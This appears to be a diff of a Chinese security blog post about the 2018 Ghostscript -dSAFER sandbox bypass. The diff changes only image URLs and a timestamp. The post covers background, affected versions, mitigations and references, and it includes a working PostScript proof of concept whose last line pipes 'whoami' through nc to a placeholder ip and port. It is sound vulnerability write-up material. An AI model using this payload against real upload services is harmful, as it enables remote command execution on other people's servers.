@@ -94,15 +94,15 @@
 <meta property="og:site_name" content="SuNu11&#39;Blog">
 <meta property="og:description" content="背景8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/23-1.png">
-<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/23-3.png">
-<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/23-4.png">
-<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/23-2.png">
-<meta property="og:updated_time" content="2018-08-23T05:56:48.765Z">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/23-3.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/23-4.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/23-2.png">
+<meta property="og:updated_time" content="2018-10-18T08:02:49.818Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="GhostScript沙箱绕过">
 <meta name="twitter:description" content="背景8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。">
-<meta name="twitter:image" content="http://ofum8yjv2.bkt.clouddn.com/23-1.png">
+<meta name="twitter:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png">
 
 
 
@@ -385,13 +385,13 @@
       
 
       
-        <p><img src="http://ofum8yjv2.bkt.clouddn.com/23-1.png" alt="23-1"></p>
+        <p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-1.png" alt="23-1"></p>
 <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 ghostscript 的安全沙箱可以被绕过，通过构造恶意的图片内容，可造成命令执行。<a id="more"></a><br>ghostscript应用广泛，ImageMagick、python-matplotlib、libmagick 等图像处理应用均有引用。<br>在ghostscript中由于以往的安全事件，针对安全问题gs官方采用增加参数-dSAFER来开启安全沙箱，但该沙箱在程序执行过程中由LockSafetyParams这个值进行控制，此次Taviso发现通过restore操作会将该值成功覆盖，导致安全沙箱被绕过，引发命令执行漏洞。</p>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>vps开启监听端口后，对图片上传功能进行测试，上传含有攻击数据的图片：<br><img src="http://ofum8yjv2.bkt.clouddn.com/23-3.png" alt="23-3"></p>
-<p>服务器收到回显：<br><img src="http://ofum8yjv2.bkt.clouddn.com/23-4.png" alt="23-4"></p>
+<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><h3 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h3><p>vps开启监听端口后，对图片上传功能进行测试，上传含有攻击数据的图片：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-3.png" alt="23-3"></p>
+<p>服务器收到回显：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-4.png" alt="23-4"></p>
 <h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">save</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</div><div class="line">&#123; legal &#125; stopped &#123; pop &#125; if</div><div class="line">restore</div><div class="line">mark /OutputFile (%pipe%whoami|nc ip port) currentdevice putdeviceprops</div></pre></td></tr></table></figure>
 <h2 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h2><p>version &lt;= 9.23（全版本、全平台）<br>所有引用ghostscript的上游应用如：<br>imagemagick<br>libmagick<br>graphicsmagick<br>gimp<br>python-matplotlib<br>texlive-core<br>texmacs<br>latex2html<br>latex2rtf<br>等</p>
-<h2 id="缓解措施："><a href="#缓解措施：" class="headerlink" title="缓解措施："></a>缓解措施：</h2><p>1、卸载ghostscript。<br>2、使用ImageMagick，建议修改policy文件。<br>（默认位置：/etc/ImageMagick/policy.xml），在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）<br><img src="http://ofum8yjv2.bkt.clouddn.com/23-2.png" alt="23-2"> </policy></policymap></p>
+<h2 id="缓解措施："><a href="#缓解措施：" class="headerlink" title="缓解措施："></a>缓解措施：</h2><p>1、卸载ghostscript。<br>2、使用ImageMagick，建议修改policy文件。<br>（默认位置：/etc/ImageMagick/policy.xml），在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/23-2.png" alt="23-2"> </policy></policymap></p>
 <h2 id="参考信息："><a href="#参考信息：" class="headerlink" title="参考信息："></a>参考信息：</h2><p>1、漏洞分析：<br><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247485615&amp;idx=1&amp;sn=b25c47324b771266c0d62cb46c263f42&amp;chksm=fe250daec95284b81a882aeecf36a50e39d8fb7e7e82ac4affd16b7f60ddb6741c99aeb851b3&amp;scene=21#wechat_redirect</a><br>2、邮件列表：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="external">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></p>
 
       
